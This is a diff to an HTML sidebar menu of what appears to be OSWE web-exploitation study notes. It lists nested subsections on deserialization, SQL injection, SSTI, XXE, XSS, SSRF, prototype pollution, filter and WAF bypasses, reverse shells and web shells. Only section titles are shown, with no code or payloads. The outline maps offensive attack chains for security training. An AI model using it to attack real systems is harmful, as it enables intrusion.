+<button class="nested-dropdown-btn">6.2 DotNetNuke Vulnerability Analysis<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-dnn-vuln-overview">6.2.1 Vulnerability Overview</a>
+<a href="#oswe-dnn-cookie-flow">6.2.2 Cookie Processing Flow</a>
+<a href="#oswe-dnn-unauth">6.2.3 Why Unauthenticated Access Works</a>
+<a href="#oswe-dnn-debugging">6.2.4 Debugging Setup</a>
+</div>
+</div>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">6.3 Payload Construction<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-dnn-pullfile">6.3.1 FileSystemUtils.PullFile</a>
+<a href="#oswe-dnn-objectdataprovider">6.3.2 ObjectDataProvider Class</a>
+<a href="#oswe-dnn-serialization-problem">6.3.3 Serialization Problem</a>
+<a href="#oswe-dnn-expandedwrapper">6.3.4 ExpandedWrapper for Type Compatibility</a>
+</div>
+</div>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">6.4 Full Exploit<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-dnn-xml-payload">6.4.1 Serialized XML Payload</a>
+<a href="#oswe-dnn-delivery">6.4.2 Delivering the Payload</a>
+<a href="#oswe-dnn-revshell">6.4.3 Reverse Shell</a>
+<a href="#oswe-dnn-ysoserial">6.4.4 ysoserial.net</a>
+</div>
+</div>
 </div>
 <button class="dropdown-btn section-flow-7">7. ERPNext Auth Bypass and SSTI<i class="bi bi-caret-down-fill"></i></button>
 <div class="dropdown-container section-flow-7">
 <a class="dropdown-link" href="#oswe-erpnext-overview">7.1 Overview</a>
-<a class="dropdown-link" href="#oswe-erpnext-setup">7.2 Environment Setup</a>
-<a class="dropdown-link" href="#oswe-erpnext-frappe-routing">7.3 Frappe Framework HTTP Routing</a>
-<a class="dropdown-link" href="#oswe-erpnext-sqli-discovery">7.4 Authentication Bypass via SQL Injection</a>
-<a class="dropdown-link" href="#oswe-erpnext-ssti">7.5 Server-Side Template Injection</a>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">7.2 Environment Setup<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-erpnext-smtp-config">7.2.1 SMTP Server Configuration</a>
+<a href="#oswe-erpnext-remote-debug">7.2.2 Remote Debugging with ptvsd</a>
+<a href="#oswe-erpnext-db-logging">7.2.3 MariaDB Query Logging</a>
+</div>
+</div>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">7.3 Frappe Framework HTTP Routing<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-erpnext-whitelist">7.3.1 The Whitelist Decorator</a>
+<a href="#oswe-erpnext-handler">7.3.2 Request Handler Flow</a>
+<a href="#oswe-erpnext-access-control">7.3.3 Access Control and Routing</a>
+</div>
+</div>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">7.4 Authentication Bypass via SQL Injection<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-erpnext-sqli-exploit">7.4.1 Exploiting the SQLi</a>
+<a href="#oswe-erpnext-collation">7.4.2 Resolving Collation Errors</a>
+<a href="#oswe-erpnext-admin-info">7.4.3 Obtaining Admin User Information</a>
+<a href="#oswe-erpnext-password-reset">7.4.4 Resetting the Admin Password</a>
+</div>
+</div>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">7.5 Server-Side Template Injection<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-erpnext-jinja-basics">7.5.1 Jinja2 Templating Basics</a>
+<a href="#oswe-erpnext-mro-payload">7.5.2 The Classic SSTI Payload</a>
+<a href="#oswe-erpnext-ssti-discovery">7.5.3 SSTI Discovery</a>
+<a href="#oswe-erpnext-ssti-filter-bypass">7.5.4 Filter Evasion with Jinja attr() Filter</a>
+<a href="#oswe-erpnext-ssti-rce">7.5.5 SSTI to RCE</a>
+</div>
+</div>
 </div>
 <button class="dropdown-btn section-flow-8">8. openCRX Auth Bypass and RCE<i class="bi bi-caret-down-fill"></i></button>
 <div class="dropdown-container section-flow-8">
-<a class="dropdown-link" href="#oswe-opencrx-overview">8.1 Overview</a>
-<a class="dropdown-link" href="#oswe-opencrx-reset">8.2 Password Reset Token Prediction</a>
-<a class="dropdown-link" href="#oswe-opencrx-xxe">8.3 XML External Entity Injection</a>
-<a class="dropdown-link" href="#oswe-opencrx-hsqldb">8.4 HSQLDB Access and RCE</a>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">8.1 Overview<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-opencrx-packaging">8.1.1 Java Application Packaging</a>
+<a href="#oswe-opencrx-structure">8.1.2 Application Structure</a>
+</div>
+</div>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">8.2 Password Reset Token Prediction<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-opencrx-reset-flow">8.2.1 Password Reset Code Flow</a>
+<a href="#oswe-opencrx-random-base62">8.2.2 Vulnerable Token Generation</a>
+<a href="#oswe-opencrx-random-vs-secure">8.2.3 java.util.Random vs SecureRandom</a>
+<a href="#oswe-opencrx-account-enum">8.2.4 Account Determination</a>
+<a href="#oswe-opencrx-timing">8.2.5 Timing the Reset Request</a>
+<a href="#oswe-opencrx-token-gen">8.2.6 Token Generation</a>
+<a href="#oswe-opencrx-automate-reset">8.2.7 Automating Password Resets</a>
+</div>
+</div>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">8.3 XML External Entity Injection<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-opencrx-xml-basics">8.3.1 XML Entity Basics</a>
+<a href="#oswe-opencrx-xxe-vector">8.3.2 Finding the Attack Vector</a>
+<a href="#oswe-opencrx-xxe-cdata">8.3.3 CDATA Wrapping for XML-Containing Files</a>
+<a href="#oswe-opencrx-xxe-directory">8.3.4 Directory Enumeration via XXE</a>
+</div>
+</div>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">8.4 HSQLDB Access and RCE<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-opencrx-hsqldb-creds">8.4.1 Discovering HSQLDB Credentials</a>
+<a href="#oswe-opencrx-jrt">8.4.2 Java Language Routines (JRT)</a>
+<a href="#oswe-opencrx-write-file">8.4.3 Writing Files via writeBytesToFilename</a>
+<a href="#oswe-opencrx-webshell">8.4.4 Writing a JSP Web Shell</a>
+</div>
+</div>
 </div>
 <button class="dropdown-btn section-flow-9">9. openITCOCKPIT XSS and OS Command Injection<i class="bi bi-caret-down-fill"></i></button>
 <div class="dropdown-container section-flow-9">
 <a class="dropdown-link" href="#oswe-openitcockpit-overview">9.1 Overview</a>
-<a class="dropdown-link" href="#oswe-openitcockpit-discovery">9.2 Application Discovery</a>
-<a class="dropdown-link" href="#oswe-openitcockpit-dom-xss">9.3 DOM-Based XSS</a>
-<a class="dropdown-link" href="#oswe-openitcockpit-xss-exploitation">9.4 Advanced XSS Exploitation</a>
-<a class="dropdown-link" href="#oswe-openitcockpit-cmdi">9.5 OS Command Injection via WebSocket</a>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">9.2 Application Discovery<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-openitcockpit-sitemap">9.2.1 Building a Sitemap</a>
+<a href="#oswe-openitcockpit-targeted-discovery">9.2.2 Targeted Discovery</a>
+</div>
+</div>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">9.3 DOM-Based XSS<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-openitcockpit-xss-hunting">9.3.1 XSS Hunting</a>
+</div>
+</div>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">9.4 Advanced XSS Exploitation<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-openitcockpit-xss-limitations">9.4.1 Capabilities and Limitations</a>
+<a href="#oswe-openitcockpit-dom-writing">9.4.2 Writing to DOM</a>
+<a href="#oswe-openitcockpit-database">9.4.3 Creating the Database (db.py)</a>
+<a href="#oswe-openitcockpit-api">9.4.4 Creating the API Server (api.py)</a>
+<a href="#oswe-openitcockpit-scraping">9.4.5 Scraping Content (client.js)</a>
+<a href="#oswe-openitcockpit-dumping">9.4.6 Dumping the Contents (dump.py)</a>
+</div>
+</div>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">9.5 OS Command Injection via WebSocket<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-openitcockpit-websocket-analysis">9.5.1 Analyzing the WebSocket Protocol</a>
+<a href="#oswe-openitcockpit-websocket-client">9.5.2 Building a WebSocket Client (wsclient.py)</a>
+<a href="#oswe-openitcockpit-command-fuzzing">9.5.3 Command Fuzzing and Injection</a>
+</div>
+</div>
 </div>
 <button class="dropdown-btn section-flow-10">10. Concord Auth Bypass to RCE<i class="bi bi-caret-down-fill"></i></button>
 <div class="dropdown-container section-flow-10">
 <a class="dropdown-link" href="#oswe-concord-overview">10.1 Overview</a>
-<a class="dropdown-link" href="#oswe-concord-discovery">10.2 Authentication Analysis</a>
-<a class="dropdown-link" href="#oswe-concord-exploit">10.3 Exploitation</a>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">10.2 Authentication Analysis<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-concord-initial-recon">10.2.1 Initial Reconnaissance</a>
+<a href="#oswe-concord-sop">10.2.2 Same-Origin Policy (SOP)</a>
+<a href="#oswe-concord-cors">10.2.3 Cross-Origin Resource Sharing (CORS)</a>
+<a href="#oswe-concord-preflight">10.2.4 Preflight Requests</a>
+<a href="#oswe-concord-samesite">10.2.5 SameSite Cookie Attribute</a>
+<a href="#oswe-concord-cors-discovery">10.2.6 Discovering Unsafe CORS in Concord</a>
+</div>
+</div>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">10.3 Exploitation<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-concord-csrf-exploit">10.3.1 Round One: CSRF via Permissive CORS</a>
+<a href="#oswe-concord-insecure-defaults">10.3.2 Round Two: Insecure Defaults</a>
+<a href="#oswe-concord-full-python-exploit">10.3.3 Full Python Exploit</a>
+</div>
+</div>
 </div>
 <button class="dropdown-btn section-flow-11">11. Server-Side Request Forgery<i class="bi bi-caret-down-fill"></i></button>
 <div class="dropdown-container section-flow-11">
 <a class="dropdown-link" href="#oswe-ssrf-overview">11.1 Overview</a>
-<a class="dropdown-link" href="#oswe-ssrf-microservices">11.2 Microservices Architecture</a>
-<a class="dropdown-link" href="#oswe-ssrf-discovery">11.3 API Discovery via Verb Tampering</a>
-<a class="dropdown-link" href="#oswe-ssrf-exploitation">11.4 SSRF Discovery and Exploitation</a>
-<a class="dropdown-link" href="#oswe-ssrf-blind-exploitation">11.5 Blind SSRF Exploitation</a>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">11.2 Microservices Architecture<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-ssrf-url-formats">11.2.1 RESTful URL Formats</a>
+</div>
+</div>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">11.3 API Discovery via Verb Tampering<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-ssrf-initial-enum">11.3.1 Initial Enumeration</a>
+<a href="#oswe-ssrf-verb-tampering">11.3.2 Advanced Enumeration with Verb Tampering</a>
+</div>
+</div>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">11.4 SSRF Discovery and Exploitation<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-ssrf-source-analysis">11.4.1 Source Code Analysis</a>
+</div>
+</div>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">11.5 Blind SSRF Exploitation<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-ssrf-port-scanning">11.5.1 Port Scanning via SSRF</a>
+<a href="#oswe-ssrf-subnet-scanning">11.5.2 Subnet and Gateway Scanning</a>
+<a href="#oswe-ssrf-host-enum">11.5.3 Host and Port Enumeration</a>
+</div>
+</div>
 <a class="dropdown-link" href="#oswe-ssrf-render-bypass">11.6 Render API Auth Bypass</a>
-<a class="dropdown-link" href="#oswe-ssrf-headless-chrome">11.7 Exploiting Headless Chrome</a>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">11.7 Exploiting Headless Chrome<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-ssrf-js-verification">11.7.1 Verifying JavaScript Execution</a>
+<a href="#oswe-ssrf-data-exfil">11.7.2 Exfiltrating Internal Data</a>
+<a href="#oswe-ssrf-steal-apikey">11.7.3 Stealing the Kong API Key</a>
+</div>
+</div>
 <a class="dropdown-link" href="#oswe-ssrf-render-source">11.8 Render Service Source Code Analysis</a>
-<a class="dropdown-link" href="#oswe-ssrf-rce">11.9 Remote Code Execution</a>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">11.9 Remote Code Execution<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-ssrf-lua-payload">11.9.1 Generating the Lua Payload</a>
+<a href="#oswe-ssrf-rce-payload">11.9.2 JavaScript RCE Payload</a>
+<a href="#oswe-ssrf-rce-trigger">11.9.3 Delivering and Triggering the Exploit</a>
+<a href="#oswe-ssrf-attack-chain">11.9.4 Complete Attack Chain Summary</a>
+</div>
+</div>
 </div>
 <button class="dropdown-btn section-flow-12">12. Guacamole Lite Prototype Pollution<i class="bi bi-caret-down-fill"></i></button>
 <div class="dropdown-container section-flow-12">
 <a class="dropdown-link" href="#oswe-prototype-pollution-overview">12.1 Overview</a>
-<a class="dropdown-link" href="#oswe-prototype-pollution-app-structure">12.2 Application Structure</a>
-<a class="dropdown-link" href="#oswe-prototype-pollution-fundamentals">12.3 JavaScript Prototype Fundamentals</a>
-<a class="dropdown-link" href="#oswe-prototype-pollution-vuln-merge">12.4 Vulnerable Merge Functions</a>
-<a class="dropdown-link" href="#oswe-prototype-pollution-discovery-blackbox">12.5 Blackbox Discovery</a>
-<a class="dropdown-link" href="#oswe-prototype-pollution-discovery-whitebox">12.6 Whitebox Discovery</a>
-<a class="dropdown-link" href="#oswe-prototype-pollution-ejs">12.7 EJS Template Engine RCE</a>
-<a class="dropdown-link" href="#oswe-prototype-pollution-handlebars">12.8 Handlebars Template Engine RCE</a>
-<a class="dropdown-link" href="#oswe-prototype-pollution-exploit-script">12.9 Automated Exploit</a>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">12.2 Application Structure<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-prototype-pollution-endpoints">12.2.1 Key Endpoints</a>
+<a href="#oswe-prototype-pollution-docker">12.2.2 Docker Compose Layout</a>
+</div>
+</div>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">12.3 JavaScript Prototype Fundamentals<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-prototype-pollution-chain">12.3.1 Prototype Chain</a>
+<a href="#oswe-prototype-pollution-chain-resolution">12.3.2 Chain Resolution and Override</a>
+<a href="#oswe-prototype-pollution-object-proto">12.3.3 Object.prototype Affects Everything</a>
+</div>
+</div>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">12.4 Vulnerable Merge Functions<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-prototype-pollution-vuln-pattern">12.4.1 Vulnerable Pattern</a>
+<a href="#oswe-prototype-pollution-safe-pattern">12.4.2 Non-Vulnerable Pattern</a>
+<a href="#oswe-prototype-pollution-enumeration">12.4.3 Pollution Side Effects</a>
+</div>
+</div>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">12.5 Blackbox Discovery<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-prototype-pollution-discovery">12.5.1 Crash-Based Detection</a>
+</div>
+</div>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">12.6 Whitebox Discovery<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-prototype-pollution-npm-audit">12.6.1 Package Enumeration</a>
+<a href="#oswe-prototype-pollution-deep-extend-source">12.6.2 deep-extend Source Analysis</a>
+<a href="#oswe-prototype-pollution-clientconnection">12.6.3 Vulnerable Call Site in guacamole-lite</a>
+</div>
+</div>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">12.7 EJS Template Engine RCE<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-prototype-pollution-ejs-poc">12.7.1 EJS Detection (PoC)</a>
+<a href="#oswe-prototype-pollution-ejs-rce">12.7.2 EJS RCE via outputFunctionName</a>
+</div>
+</div>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">12.8 Handlebars Template Engine RCE<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-prototype-pollution-hbs-compilation">12.8.1 Handlebars Compilation Flow</a>
+<a href="#oswe-prototype-pollution-hbs-poc">12.8.2 Handlebars Detection (PoC)</a>
+<a href="#oswe-prototype-pollution-hbs-numberliteral">12.8.3 NumberLiteral Injection (Unescaped Path)</a>
+<a href="#oswe-prototype-pollution-hbs-ast-injection">12.8.4 AST Injection via Prototype Pollution</a>
+<a href="#oswe-prototype-pollution-hbs-rce">12.8.5 Full Handlebars RCE Payload</a>
+</div>
+</div>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">12.9 Automated Exploit<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-prototype-pollution-detection-summary">12.9.1 Template Engine Detection Summary</a>
+</div>
+</div>
 </div>
 <button class="dropdown-btn section-flow-13">13. Dolibarr Eval Filter Bypass RCE<i class="bi bi-caret-down-fill"></i></button>
 <div class="dropdown-container section-flow-13">
 <a class="dropdown-link" href="#oswe-dolibarr-overview">13.1 Overview</a>
-<a class="dropdown-link" href="#oswe-dolibarr-dangerous-functions">13.2 Dangerous Functions</a>
-<a class="dropdown-link" href="#oswe-dolibarr-source-analysis">13.3 Source Code Analysis</a>
-<a class="dropdown-link" href="#oswe-dolibarr-filter-analysis">13.4 Filter Analysis</a>
-<a class="dropdown-link" href="#oswe-dolibarr-bypass">13.5 Filter Bypass Techniques</a>
-<a class="dropdown-link" href="#oswe-dolibarr-exploit">13.6 Exploitation</a>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">13.2 Dangerous Functions<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-dolibarr-js-eval">13.2.1 JavaScript eval()</a>
+<a href="#oswe-dolibarr-php-eval">13.2.2 PHP eval()</a>
+</div>
+</div>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">13.3 Source Code Analysis<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-dolibarr-doleval-function">13.3.1 The dol_eval() Function</a>
+</div>
+</div>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">13.4 Filter Analysis<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-dolibarr-filter-layer1">13.4.1 Layer 1: Character Allowlist</a>
+<a href="#oswe-dolibarr-filter-layer2">13.4.2 Layer 2: Specific Character Blocks</a>
+<a href="#oswe-dolibarr-filter-layer3">13.4.3 Layer 3: Function Blocklist</a>
+</div>
+</div>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">13.5 Filter Bypass Techniques<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-dolibarr-bypass-getfunctions">13.5.1 Dynamic Function Invocation via get_defined_functions()</a>
+<a href="#oswe-dolibarr-bypass-reflection">13.5.2 Reflection-Based Bypass</a>
+<a href="#oswe-dolibarr-bypass-encoding">13.5.3 Alternative Encoding Bypasses</a>
+<a href="#oswe-dolibarr-bypass-strings">13.5.4 String Manipulation Bypasses</a>
+</div>
+</div>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">13.6 Exploitation<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-dolibarr-exploit-finding-target">13.6.1 Finding the Vulnerable Call</a>
+<a href="#oswe-dolibarr-exploit-trigger">13.6.2 Triggering the Vulnerability</a>
+<a href="#oswe-dolibarr-exploit-rce">13.6.3 Remote Code Execution</a>
+<a href="#oswe-dolibarr-exploit-revshell">13.6.4 Reverse Shell</a>
+</div>
+</div>
 </div>
 <button class="dropdown-btn section-flow-14">14. RudderStack SQLi and WAF Bypass<i class="bi bi-caret-down-fill"></i></button>
 <div class="dropdown-container section-flow-14">
 <a class="dropdown-link" href="#oswe-rudderstack-overview">14.1 Overview</a>
 <a class="dropdown-link" href="#oswe-rudderstack-lab-setup">14.2 Lab Setup</a>
-<a class="dropdown-link" href="#oswe-rudderstack-endpoint-discovery">14.3 API Endpoint Discovery</a>
-<a class="dropdown-link" href="#oswe-rudderstack-sqli-discovery">14.4 SQL Injection Discovery</a>
-<a class="dropdown-link" href="#oswe-rudderstack-sqli-exploit">14.5 Exploitation</a>
-<a class="dropdown-link" href="#oswe-rudderstack-waf">14.6 WAF Bypass</a>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">14.3 API Endpoint Discovery<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-rudderstack-endpoint-extraction">14.3.1 Extracting and Cleaning Endpoint URLs</a>
+<a href="#oswe-rudderstack-endpoint-fuzzing">14.3.2 Fuzzing Endpoints with Burp Intruder</a>
+</div>
+</div>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">14.4 SQL Injection Discovery<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-rudderstack-sqli-request-format">14.4.1 Request Format</a>
+<a href="#oswe-rudderstack-sqli-vulnerable-function">14.4.2 Vulnerable SQL Construction</a>
+</div>
+</div>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">14.5 Exploitation<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-rudderstack-sqli-confirm">14.5.1 Confirming SQL Injection</a>
+<a href="#oswe-rudderstack-sqli-stacked">14.5.2 Stacked Query Injection</a>
+<a href="#oswe-rudderstack-sqli-rce">14.5.3 RCE via PostgreSQL COPY TO PROGRAM</a>
+</div>
+</div>
+<div class="nested-dropdown">
+<button class="nested-dropdown-btn">14.6 WAF Bypass<i class="bi bi-caret-down-fill"></i></button>
+<div class="nested-dropdown-container">
+<a href="#oswe-rudderstack-waf-overview">14.6.1 Web Application Firewall Concepts</a>
+<a href="#oswe-rudderstack-waf-coraza">14.6.2 Coraza WAF Setup</a>
+<a href="#oswe-rudderstack-waf-trigger">14.6.3 Triggering the WAF</a>
+<a href="#oswe-rudderstack-waf-rule-analysis">14.6.4 WAF Rule Analysis</a>
+<a href="#oswe-rudderstack-waf-regex">14.6.5 Understanding the WAF Regex</a>
+<a href="#oswe-rudderstack-waf-bypass-technique">14.6.6 Crafting the Bypass</a>
+</div>
+</div>
 </div>
 </div>
 
